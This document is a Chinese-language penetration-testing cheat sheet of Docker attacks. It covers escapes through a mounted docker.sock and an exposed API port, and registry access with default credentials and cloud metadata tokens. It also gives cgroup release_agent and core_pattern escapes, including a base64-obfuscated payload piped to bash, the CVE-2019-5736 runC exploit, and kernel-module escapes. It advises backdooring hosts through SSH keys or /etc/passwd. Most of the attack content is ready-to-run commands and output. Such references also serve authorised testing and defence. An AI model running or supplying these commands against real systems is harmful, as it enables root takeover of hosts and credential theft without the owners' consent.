# Docker

> Docker 是一套平台即服务 (PaaS) 产品，它使用操作系统级虚拟化来交付名为“容器”的软件包。

## 目录 (Summary)

- [工具 (Tools)](#tools)
- [挂载的 Docker 套接字 (Mounted Docker Socket)](#mounted-docker-socket)
- [开放的 Docker API 端口 (Open Docker API Port)](#open-docker-api-port)
- [不安全的 Docker 仓库 (Insecure Docker Registry)](#insecure-docker-registry)
- [滥用 Linux cgroup v1 攻击特权容器 (Exploit privileged container abusing the Linux cgroup v1)](#exploit-privileged-container-abusing-the-linux-cgroup-v1)
    - [滥用 CAP_SYS_ADMIN 权限](#abusing-cap_sys_admin-capability)
    - [滥用核心转储 (coredumps) 和 core_pattern](#abusing-coredumps-and-core_pattern)
- [通过 runC 逃逸 Docker (Breaking out of Docker via runC)](#breaking-out-of-docker-via-runc)
- [使用设备文件逃逸容器 (Breaking out of containers using a device file)](#breaking-out-of-containers-using-a-device-file)
- [参考资料 (References)](#references)

## 工具 (Tools)

- [kost/dockscan](https://github.com/kost/dockscan) : Dockscan 是针对 Docker 安装环境的安全性漏洞及审计扫描器。

    ```powershell
    dockscan unix:///var/run/docker.sock
    dockscan -r html -o myreport -v tcp://example.com:5422
    ```

- [stealthcopter/deepce](https://github.com/stealthcopter/deepce) : Docker 枚举、提权与容器逃逸 (DEEPCE)。

    ```powershell
    ./deepce.sh 
    ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
    ./deepce.sh --no-enumeration --exploit SOCK --shadow
    ./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"
    ```

- [orisano/dlayer](https://github.com/orisano/dlayer) : dlayer 是一个 Docker 图层分析器。

    ```powershell
    docker pull orisano/dlayer
    docker save image:tag | dlayer -i
    ```

- [wagoodman/dive](https://github.com/wagoodman/dive) : 一个用于探索 Docker 镜像中每一层的工具。

    ```powershell
    alias dive="docker run -ti --rm  -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive"
    dive <你的镜像标签>
    ```

## 挂载的 Docker 套接字 (Mounted Docker Socket)

前提条件：

- 套接字已作为卷挂载：`- "/var/run/docker.sock:/var/run/docker.sock"`

通常位于 `/var/run/docker.sock`，例如 Portainer。

```powershell
curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
curl -XPOST –unix-socket /var/run/docker.sock -d '{"Image":"nginx"}' -H 'Content-Type: application/json' http://localhost/containers/create
curl -XPOST –unix-socket /var/run/docker.sock http://localhost/containers/上一步获得的ID/start
```

使用 [brompwnie/ed](https://github.com/brompwnie/ed) 进行攻击：

```powershell
root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true        
[+] Hunt dem Socks
[+] Hunting Down UNIX Domain Sockets from: /var/run/
[*] Valid Socket: /var/run/docker.sock
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to Autopwn:  /var/run/docker.sock
[*] Getting Docker client...
[*] Successfully got Docker client...
[+] Attempting to escape to host...
[+] Attempting in TTY Mode
chroot /host && clear
echo 'You are now on the underlying host'
chroot /host && clear
echo 'You are now on the underlying host'
/ # chroot /host && clear
/ # echo 'You are now on the underlying host'
You are now on the underlying host
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

## 开放的 Docker API 端口 (Open Docker API Port)

前提条件：

- 运行 Docker 时使用了 `-H tcp://0.0.0.0:XXXX`。

```powershell
$ nmap -sCV 10.10.10.10 -p 2376
2376/tcp open  docker  Docker 19.03.5
| docker-version:
|   Version: 19.03.5
|   MinAPIVersion: 1.12
```

将当前系统挂载到一个新的“临时”Ubuntu 容器中，你将在 `/mnt` 中获得对文件系统的 root 访问权限。

```powershell
$ export DOCKER_HOST=tcp://10.10.10.10:2376
$ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0  -t ubuntu bash
或者
$ docker -H  open.docker.socket:2375 ps
$ docker -H  open.docker.socket:2375 exec -it mysql /bin/bash
或者 
$ curl -s –insecure https://tls-opendocker.socket:2376/secrets | jq
$ curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```

从这里开始，你可以通过在 `/root/.ssh` 中添加 SSH 密钥或在 `/etc/passwd` 中添加新的 root 用户来为文件系统设置后门。

## 不安全的 Docker 仓库 (Insecure Docker Registry)

Docker 仓库的指纹是 `Docker-Distribution-Api-Version` 响应头。然后连接到仓库的 API 端点：`/v2/_catalog`。

```powershell
curl https://registry.example.com/v2/<image_name>/tags/list
docker pull https://registry.example.com:443/<image_name>:<tag>

# 连接到端点并列出镜像 blob
curl -s -k --user "admin:admin" https://docker.registry.local/v2/_catalog
curl -s -k --user "admin:admin" https://docker.registry.local/v2/wordpress-image/tags/list
curl -s -k --user "admin:admin" https://docker.registry.local/v2/wordpress-image/manifests/latest
# 下载 blob
curl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058' > out.tar.gz
# 自动下载
https://github.com/NotSoSecure/docker_fetch/
python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local
```

访问私有仓库并使用其镜像启动容器：

```powershell
docker login -u admin -p admin docker.registry.local
docker pull docker.registry.local/wordpress-image
docker run -it docker.registry.local/wordpress-image /bin/bash
```

使用来自 Google 的 OAuth 令牌访问私有仓库：

```powershell
curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email
curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token 
docker login -e <email> -u oauth2accesstoken -p "<access token>" https://gcr.io
```

## 滥用 Linux cgroup v1 攻击特权容器 (Exploit privileged container abusing the Linux cgroup v1)

前提条件（至少满足其一）：

- `--privileged`
- `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN` 标志。

### 滥用 CAP_SYS_ADMIN 权限

```powershell
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c 'echo "cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK" | base64 -d | bash -'
```

漏洞攻击 breakdown：

```powershell
# 在宿主机上
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# 在容器内
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 滥用核心转储 (coredumps) 和 core_pattern

1. 使用 `mount` 找到挂载点：

    ```ps1
    $ mount | head -n 1
    overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YLH6C6EQMMG7DA2AL5DUANDHYJ:/var/lib/docker/overlay2/l/HP7XLDFT4ERSCYVHJ2WMZBG2YT,upperdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff,workdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/work)
    ```

2. 在文件系统根目录下创建一个恶意二进制文件：`cp /tmp/poc /poc`
3. 设置在核心转储上要执行的程序：

    ```ps1
    echo "|/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff/poc" > /proc/sys/kernel/core_pattern
    ```

4. 编写一个错误的程序以生成核心转储：`gcc -o crash crash.c && ./crash`

    ```cpp
    int main(void) {
        char buf[1];
        for (int i = 0; i < 100; i++) {
            buf[i] = 1;
        }
        return 0;
    }
    ```

5. 你的 Payload 应该已经在宿主机上执行了。

## 通过 runC 逃逸 Docker (Breaking out of Docker via runC)

> 该漏洞允许恶意容器（在极少用户交互的情况下）覆盖宿主机的 runc 二进制文件，从而在宿主机上获得 root 级别的代码执行权限。用户交互的程度仅限于能够在容器内以 root 身份运行任何命令，且必须满足以下任一背景：使用攻击者控制的镜像创建新容器；附加 (docker exec) 到攻击者先前具有写入权限的现有容器。 —— runC 团队漏洞概述。

CVE-2019-5736 的攻击程序：[twistlock/RunC-CVE-2019-5736](https://github.com/twistlock/RunC-CVE-2019-5736)

```powershell
docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC
docker run --rm cve-2019-5736:malicious_image_POC
```

## 使用设备文件逃逸容器 (Breaking out of containers using a device file)

```powershell
https://github.com/FSecureLABS/fdpasser
在容器内，以 root 身份执行： ./fdpasser recv /moo /etc/shadow
在容器外，以 UID 1000 身份执行： ./fdpasser send /proc/$(pgrep -f "sleep 1337")/root/moo
在容器外执行： ls -la /etc/shadow
输出： -rwsrwsrwx 1 root shadow 1209 Oct 10  2019 /etc/shadow
```

## 通过加载内核模块逃逸 Docker (Breaking out of Docker via kernel modules loading)

> 当特权 Linux 容器尝试加载内核模块时，这些模块会被加载进宿主机的内核中（因为与虚拟机不同，内核只有*一个*）。这为容器逃逸提供了一条简单的途径。

漏洞攻击：

- 克隆仓库：`git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping`
- 使用 `make` 进行构建
- 使用以下命令启动特权 Docker 容器：`docker run -it --privileged --hostname docker --mount "type=bind,src=$PWD,dst=/root" ubuntu`
- 在新容器中 `cd /root`
- 使用 `./escape` 插入内核模块
- 运行 `./execute`！

与其他技术不同，此模块不包含任何系统调用钩子 (syscalls hooks)，而只是创建了两个新的 proc 文件：`/proc/escape` 和 `/proc/output`。

- `/proc/escape` 仅响应写入请求，并简单地执行通过 [`call_usermodehelper()`](https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html) 传递给它的任何内容。
- `/proc/output` 只是接收输入并在写入时将其存储在缓冲区中，然后在读取时返回该缓冲区 —— 本质上充当了容器和宿主机都可以读写的文件。

巧妙之处在于，我们写入 `/proc/escape` 的任何内容都会被夹在 `/bin/sh -c <输入> > /proc/output` 中。这意味着命令是在 `/bin/sh` 下运行的，并且输出被重定向到 `/proc/output`，随后我们可以在容器内读取该文件。

加载模块后，你只需执行 `echo "cat /etc/passwd" > /proc/escape`，然后通过 `cat /proc/output` 获取结果。或者，你可以使用 `execute` 程序为自己提供一个临时 shell（尽管是一个非常基础的 shell）。

唯一的注意事项是我们无法确定容器是否安装了 `kmod`（它提供 `insmod` 和 `rmmod`）。为了克服这个问题，在构建内核模块后，我们会将其字节数组加载到一个 C 程序中，该程序随后使用 `init_module()` 系统调用将模块加载到内核中，而无需 `insmod`。如果你感兴趣，可以查看 Makefile。

## 参考资料 (References)

- [Hacking Docker Remotely - 17 March 2020 - ch0ks](https://hackarandas.com/blog/2020/03/17/hacking-docker-remotely/)
- [Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
- [Breaking out of Docker via runC – Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)
- [CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
- [OWASP - Docker Security CheatSheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md)
- [Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/)
- [Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping)
- [Escaping privileged containers for fun - 2022-03-06 :: Jordy Zomer](https://pwning.systems/posts/escaping-containers-for-fun/)
